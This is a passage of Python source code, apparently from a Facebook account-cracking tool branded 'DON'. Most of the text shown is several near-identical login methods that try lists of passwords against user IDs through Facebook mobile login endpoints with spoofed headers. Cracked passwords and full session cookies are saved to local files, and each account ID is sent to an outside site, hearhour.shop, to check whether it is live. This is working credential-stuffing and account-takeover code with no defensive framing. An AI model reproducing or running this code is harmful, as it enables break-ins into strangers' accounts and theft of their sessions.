            response = ewe.post("https://p.facebook.com/login/device-based/login/async/?api_key=1663534280540672&auth_token=b17ee38811884c2a4fea894114da656a&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1663534280540672&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100",
                data = data,
                headers = headers,
                allow_redirects = False
                )
            if "checkpoint" in ewe.cookies.get_dict():
                ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                print(f"\r\r{ping}<[DON-CP]> {ids} ● {pw} ")
                cp+=1
                open('/sdcard/DON-RANDN-M2-CP.txt','a').write(ids+'|'+pw+'\n')
                break
            elif "c_user" in ewe.cookies.get_dict():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                lk_remove =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={ids}"
                lkbal = requests.get(lk_remove).text
                if 'LIVE' in lkbal:
                    print(f"\r\r\x1b[38;5;48m<[DON-OK]> {ids} ● {pw} ")
                    print(f"\r\r\x1b[38;5;48m<[DON-OK]>{white} {kuki}")
                    ok+=1
                    open('/sdcard/DON-RANDM-M2-OK.txt', 'a').write(ids+' | '+pw+' |-> '+kuki+"\n")
                    break
                else:break
        except requests.exceptions.ConnectionError:time.sleep(15)
    loop +=1
#---------------------------| Random Method 3 |---------------------------#    
def ____M3____(uid,pwx):
    global loop,ok,cp
    sys.stdout.write(f"\r\r{white}<[DON-M3]> {Y}[{white}{loop}{Y}] [{green}OK-{ok}{Y}] [{white}{cp}{Y}] ");sys.stdout.flush()
    ewe = requests.Session()
    ua = fuck()
    for pw in pwx:
        try:
            link = ewe.get("https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
            data = {
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(link)).group(1),
                "try_number": 0,
                "unrecognized_tries": 0,
                "email": uid,
                "prefill_contact_point": uid,
                "prefill_source": "browser_dropdown",
                "prefill_type": "contact_point",
                "first_prefill_source": "browser_dropdown",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": True,
                "had_password_prefilled": False,
                "is_smart_lock": False,
                "bi_xrwh": 0,
                "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                "jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
                "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
                }
            headers = {
                "Host": "mbasic.facebook.com",
                "content-length": str(len((data))),
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
                "sec-ch-ua-mobile": "?1",
                "user-agent": ua,
                "x-response-format": "JSONStream",
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                "viewport-width": "360",
                "x-requested-with": "XMLHttpRequest",
                "x-asbd-id": "129477",
                "dpr": "2",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua-platform": '"Android"',
                "accept": "*/*",
                "origin": "https://mbasic.facebook.com",
                'referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                }
            response = ewe.post("https://mbasic.facebook.com/login/device-based/login/async/?api_key=1663534280540672&auth_token=b17ee38811884c2a4fea894114da656a&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1663534280540672&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100",
                data = data,
                headers = headers,
                allow_redirects = False
                )
            if "checkpoint" in ewe.cookies.get_dict():
                ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                print(f"\r\r{ping}<[DON-CP]> {ids} ● {pw} ")
                cp+=1
                open('/sdcard/DON-RANDN-M3-CP.txt','a').write(ids+'|'+pw+'\n')
                break
            elif "c_user" in ewe.cookies.get_dict():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                lk_remove =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={ids}"
                lkbal = requests.get(lk_remove).text
                if 'LIVE' in lkbal:
                    print(f"\r\r\x1b[38;5;48m<[DON-OK]> {ids} ● {pw} ")
                    print(f"\r\r\x1b[38;5;48m<[DON-OK]>{white} {kuki}")
                    ok+=1
                    open('/sdcard/DON-RANDM-M3-OK.txt', 'a').write(ids+' | '+pw+' |-> '+kuki+"\n")
                    break
                else:break
        except requests.exceptions.ConnectionError:time.sleep(15)
    loop +=1
#---------------------------| Random Method 4 |---------------------------#    
def ____M4____(uid,pwx):
    global loop,ok,cp
    sys.stdout.write(f"\r\r{white}<[DON-M4]> {Y}[{white}{loop}{Y}] [{green}OK-{ok}{Y}] [{white}{cp}{Y}] ");sys.stdout.flush()
    ewe = requests.Session()
    ua = fuck()
    for pw in pwx:
        try:
            link = ewe.get("https://d.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
            data = {
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(link)).group(1),
                "try_number": 0,
                "unrecognized_tries": 0,
                "email": uid,
                "prefill_contact_point": uid,
                "prefill_source": "browser_dropdown",
                "prefill_type": "contact_point",
                "first_prefill_source": "browser_dropdown",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": True,
                "had_password_prefilled": False,
                "is_smart_lock": False,
                "bi_xrwh": 0,
                "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                "jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
                "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
                }
            headers = {
                "Host": "d.facebook.com",
                "content-length": str(len((data))),
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
                "sec-ch-ua-mobile": "?1",
                "user-agent": ua,
                "x-response-format": "JSONStream",
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                "viewport-width": "360",
                "x-requested-with": "XMLHttpRequest",
                "x-asbd-id": "129477",
                "dpr": "2",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua-platform": '"Android"',
                "accept": "*/*",
                "origin": "https://d.facebook.com",
                'referer': 'https://d.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                }
            response = ewe.post("https://d.facebook.com/login/device-based/login/async/?api_key=1663534280540672&auth_token=b17ee38811884c2a4fea894114da656a&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1663534280540672&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100",
                data = data,
                headers = headers,
                allow_redirects = False
                )
            if "checkpoint" in ewe.cookies.get_dict():
                ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                print(f"\r\r{ping}<[DON-CP]> {ids} ● {pw} ")
                cp+=1
                open('/sdcard/DON-RANDN-M4-CP.txt','a').write(ids+'|'+pw+'\n')
                break
            elif "c_user" in ewe.cookies.get_dict():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                lk_remove =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={ids}"
                lkbal = requests.get(lk_remove).text
                if 'LIVE' in lkbal:
                    print(f"\r\r\x1b[38;5;48m<[DON-OK]> {ids} ● {pw} ")
                    print(f"\r\r\x1b[38;5;48m<[DON-OK]>{white} {kuki}")
                    ok+=1
                    open('/sdcard/DON-RANDM-M4-OK.txt', 'a').write(ids+' | '+pw+' |-> '+kuki+"\n")
                    break
                else:break
        except requests.exceptions.ConnectionError:time.sleep(15)
    loop +=1
    
#---------------------------| Old Uid Method |---------------------------#
def ____old____(uid,pas,tl):
    global loop,ok,cp
    sys.stdout.write(f"\r\r{white}<[DON-OLD]> {green}{loop} {Y}[{green}OK-{ok}{Y}] ");sys.stdout.flush()
    try:
        for ps in pas:
            with requests.Session() as session:
                ___old___="Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/km_KH;FBBV/394408901;FBCR/Metfone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;FBRV/396611140;]"
                headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': ___old___,'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
            po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
            if "Please Confirm Email" in str(po):
                print(f"\r\r{Y}<[DON-CP]> {uid} ● {ps}")
                open("/sdcard/DON-OLD-CP.txt",'a').write(str(uid)+"|"+str(ps)+"\n");cp+=1
                break
            elif "session_key" in po:
                print(f"\r\r{green}<[DON-OK]> {uid} ● {ps}")
                open("/sdcard/DON-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                break
            else:pass
        loop+=1
    except Exception as e:pass

if __name__=='__main__':
    try:os.mkdir('ok')
    except:pass
    try:os.mkdir('cp')
    except:pass
    os.system('clear')
    _____menux_____()